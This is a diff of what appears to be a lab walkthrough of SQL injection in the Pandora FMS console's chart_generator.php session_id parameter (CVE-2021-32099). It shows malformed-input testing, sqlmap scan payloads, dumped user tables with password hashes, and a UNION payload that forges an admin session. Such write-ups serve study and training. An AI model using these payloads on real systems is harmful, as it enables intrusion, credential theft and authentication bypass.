@@ -44,42 +44,16 @@ v7.0NG.742_FIX_PERL2020
 - [CVE-2021-32099](https://nvd.nist.gov/vuln/detail/CVE-2021-32099)
 - [CVE-2020-5844](https://nvd.nist.gov/vuln/detail/CVE-2020-5844)
 
-6. Scan
-````
-# sqlmap -u '127.0.0.1/pandora_console/include/chart_generator.php?session_id=*'
-URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] Y
-sqlmap identified the following injection point(s) with a total of 241 HTTP(s) requests:
----
-Parameter: #1* (URI)
-    Type: boolean-based blind
-    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
-    Payload: http://127.0.0.1:80/pandora_console/include/chart_generator.php?session_id=-3520' OR 1191=1191#
+6. Test the target system with malformed input values'    "   `   %    %%   --   /*   //    )    ;
+http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=%27%20%20%20%20%22%20%20%20`%20%20%20%%20%20%20%20%%%20%20%20--%20%20%20/*%20%20%20//%20%20%20%20)%20%20%20%20;
 
-    Type: error-based
-    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
-    Payload: http://127.0.0.1:80/pandora_console/include/chart_generator.php?session_id=' OR (SELECT 5536 FROM(SELECT COUNT(*),CONCAT(0x7162767671,(SELECT (ELT(5536=5536,1))),0x71707a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- VqwU
-
-    Type: time-based blind
-    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
-    Payload: http://127.0.0.1:80/pandora_console/include/chart_generator.php?session_id=' AND (SELECT 8615 FROM (SELECT(SLEEP(5)))jdWS)-- MiTJ
----
-[22:44:07] [INFO] the back-end DBMS is MySQL
-web server operating system: Linux Ubuntu 20.04 or 19.10 (focal or eoan)
-web application technology: Apache 2.4.41, PHP
-back-end DBMS: MySQL >= 5.0 (MariaDB fork)
-[22:44:07] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/127.0.0.1'
+````sql
+SQL error: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use 
+near '" ` % %% -- /* // ) ;' LIMIT 1' at line 1 ('SELECT * FROM tsessions_php WHERE `id_session` = '' " ` % %% -- /* // ) ;' LIMIT 1') in
+/var/www/pandora/pandora_console/include/db/mysql.php on line 114
 ````
 
 ````
-# sqlmap -u '127.0.0.1/pandora_console/include/chart_generator.php?session_id=*' --dbms=MySQL -T tusuario -C id_user,is_admin,password --dump
-+---------+----------+----------------------------------+
-| id_user | is_admin | password                         |
-+---------+----------+----------------------------------+
-| admin   | 1        | ad3f741b04bd5880fb32b54bc4f43d6a |
-| daniel  | 0        | 76323c174bd49ffbbdedf678f6cc89a6 |
-| matt    | 0        | f655f807365b6dc602b31ab3d6d43acc |
-+---------+----------+----------------------------------+
-
 # sqlmap -u '127.0.0.1/pandora_console/include/chart_generator.php?session_id=*' --dbms=MySQL -T tsessions_php --dump
 +----------------------------+------------------------------------------------------+-------------+
 | id_session                 | data                                                 | last_active |
@@ -159,6 +133,60 @@ back-end DBMS: MySQL >= 5.0 (MariaDB fork)
 | ul60hpp96eta3qkt2bscc8r80l | NULL                                                 | 1642642735  |
 +----------------------------+------------------------------------------------------+-------------+
 ````
+
+````sql
+'SELECT * FROM tsessions_php WHERE `id_session` = '
+
+' union SELECT 1,2,'id_usuario|s:5:"admin";' as data -- SgGO
+````
+
+
+
+
+
+
+
+
+
+
+
+
+
+6. Scan
+````
+# sqlmap -u '127.0.0.1/pandora_console/include/chart_generator.php?session_id=*'
+URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] Y
+sqlmap identified the following injection point(s) with a total of 241 HTTP(s) requests:
+---
+Parameter: #1* (URI)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: http://127.0.0.1:80/pandora_console/include/chart_generator.php?session_id=-3520' OR 1191=1191#
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: http://127.0.0.1:80/pandora_console/include/chart_generator.php?session_id=' OR (SELECT 5536 FROM(SELECT COUNT(*),CONCAT(0x7162767671,(SELECT (ELT(5536=5536,1))),0x71707a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- VqwU
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: http://127.0.0.1:80/pandora_console/include/chart_generator.php?session_id=' AND (SELECT 8615 FROM (SELECT(SLEEP(5)))jdWS)-- MiTJ
+---
+[22:44:07] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 20.04 or 19.10 (focal or eoan)
+web application technology: Apache 2.4.41, PHP
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[22:44:07] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/127.0.0.1'
+````
+
+````
+# sqlmap -u '127.0.0.1/pandora_console/include/chart_generator.php?session_id=*' --dbms=MySQL -T tusuario -C id_user,is_admin,password --dump
++---------+----------+----------------------------------+
+| id_user | is_admin | password                         |
++---------+----------+----------------------------------+
+| admin   | 1        | ad3f741b04bd5880fb32b54bc4f43d6a |
+| daniel  | 0        | 76323c174bd49ffbbdedf678f6cc89a6 |
+| matt    | 0        | f655f807365b6dc602b31ab3d6d43acc |
++---------+----------+----------------------------------+
 
 ````sql
 ' union SELECT 1,2,'id_usuario|s:5:"admin";' as data -- SgGO
